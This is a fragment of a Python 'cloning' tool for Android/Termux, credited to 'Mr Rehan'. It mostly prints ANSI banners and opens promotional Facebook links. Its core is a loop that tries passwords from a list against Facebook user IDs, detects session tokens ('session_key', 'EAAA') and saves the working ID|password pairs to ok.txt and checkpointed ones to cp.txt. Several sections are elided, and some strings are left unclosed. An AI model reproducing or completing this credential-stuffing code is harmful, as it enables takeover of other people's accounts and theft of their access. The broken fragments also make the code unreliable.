...
def logo():
 ...
 ───────────────────────────────────────────────────────×
  ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Rehan Malik\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :8\x1b[0m\x1b[1;97m] \033[1;37m 
 ───────────────────────────────────────────────────────×
 """)
def logo2():
	print ("""
    ___ ___ _ _ _____ _ _ | _`\ ( _`\ ( ) ( )( _ )( ) ( ) | (_) )| (_(_)| |_| || (_) || `\| | | , / | _)_ | _ || _ || , ` | | |\ \ | (_( )| | | || | | || |`\ | (_) (_)(____/'(_) (_)(_) (_)(_) (_) 
                                                                      
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Mr REHAN Malik\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :8\x1b[0m\x1b[1;97m] \033[1;37m 
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : Mr-Rehan \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : www.gitclone//https://github.com/REHANM91/Rehan.git\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : www.facebook./MrRehan \x1b[0m\x1b[1;97m]
───────────────────────────────────────────────────────× 
 """)
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/REHANM91/Rehan.git]")
	#yahan apni facebook id link dalna
	exit(" [=>] FACEBOOK :  https://www.facebook.com/profile.php?id=100031164900989")
...
def notice():
	...
	os.system("xdg-open https://facebook.com/groups/fbtricksandfriendzonebydeepakandjonty/ ")
	...
	os.system("xdg-open https://facebook.com/groups/fbtricksandfriendzonebydeepakandjonty/")
	subprocess.check_output(["am", "start", "https://facebook.com/groups/fbtricksandfriendzonebydeepakandjonty/"])
...
class Main:
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://github.com/REHANM91/Rehan.git).text
			if basesplit in plr:
				key = basesplit
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version : 8\x1b[0m\x1b[1;97m] \033[1;37m 
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : Mr-Rehan \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : www. https://github.com/REHANM91/Rehan.gitx1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : www.facebook./RehanMalik \x1b[0m\x1b[1;97m]
───────────────────────────────────────────────────────× 
    """)
		print("%s [%s•%s] %sTOOL NAME : %s2009 Cloning Tool"%(G,R,G,B,G))
		print("%s [%s•%s] %sVERSION   : %s8"%(G,R,G,B,G))
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;97m   [=REHAN=OK=>] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("   [=REHAN=OK=>]  %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;92m   [=REHAN=CP=>] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("   [=REHAN=CP=>]  %s|%s\n"%(uid, pw))
				break
			else:
				continue
...
if len(sys.argv) == 2:
	if sys.argv[1] == "--info":
		...
		print(" [*] Team      :  \n")
		print(" [ Sosial Medi  ] \n")
		print(" [*] Facebook  :https://www.facebook.com/profile.php?id=100031164900989 / ")
